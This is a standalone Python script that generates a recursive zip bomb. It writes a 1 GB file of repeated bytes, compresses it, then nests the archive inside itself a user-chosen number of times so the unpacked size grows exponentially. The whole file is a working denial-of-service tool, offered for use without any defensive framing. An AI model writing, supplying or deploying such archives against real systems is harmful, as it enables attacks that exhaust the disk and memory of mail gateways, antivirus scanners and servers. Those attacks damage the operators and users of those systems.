import zipfile
import os
import shutil

def createGigFile():
    file = open('zipBomb.txt', 'wb')
    pattern = b'iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii'
    for _ in range((1000**2)*10):
        file.write(pattern)
    file.close()

def createRenamedCopy(original_file_name, new_file_name):
    dir_path = os.path.dirname(os.path.realpath(__file__))
    original_file_path = os.path.join(dir_path, original_file_name)
    
    if os.path.isfile(original_file_path):
        temp_file_path = os.path.join(dir_path, "temp_" + original_file_name)
        shutil.copy(original_file_path, temp_file_path)
        
        renamed_file_path = os.path.join(dir_path, new_file_name)
        os.rename(temp_file_path, renamed_file_path)
    else:
        print(f"The file {original_file_name} does not exist.")

def createZipArchive(fileName, zipName):
    with zipfile.ZipFile(zipName, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
        for name in fileName:
            zipf.write(name, arcname=name)
            
def removeFile(fileToRemove):
    dir_path = os.path.dirname(os.path.realpath(__file__))
    os.remove(os.path.join(dir_path, fileToRemove))
    
def showFinalBombSize(number):
    size = 1
    for i in range(number):
        size *= 2
    return size

def main():
    try:
        print('This is a version that scales exponentially.')
        times = int(input('Please input desired size: '))
        
        print(f'The final size of your file will be {showFinalBombSize(times)} GB')
        question = input('is that ok? y/n: ').lower()
        
        if question == 'y':
            print('Creating 1GB file')
            createGigFile()
            print('File created')
            print('Creating base zip file')
            createZipArchive(['zipBomb.txt'], '0.zip')
            print('Base zipfile created')
            print('starting with creation of bomb')
            size = 1
            for i in range(times):
                createRenamedCopy(f'{i}.zip', f'{i}copy.zip')
                createZipArchive([f'{i}.zip', f'{i}copy.zip'], f'{i+1}.zip')
                size *= 2
                print(f'Current size: {size}GB')
                if i!= times:
                    removeFile(f'{i}.zip')
                    removeFile(f'{i}copy.zip')
            
            removeFile('zipBomb.txt')
        else:
            print('restarting main function')
            main()
    except ValueError:
        print('Please input a valid number for the bomb size.')
        main()
    except Exception as e:
        print(f'An unexpected error occurred: {e}')
main()
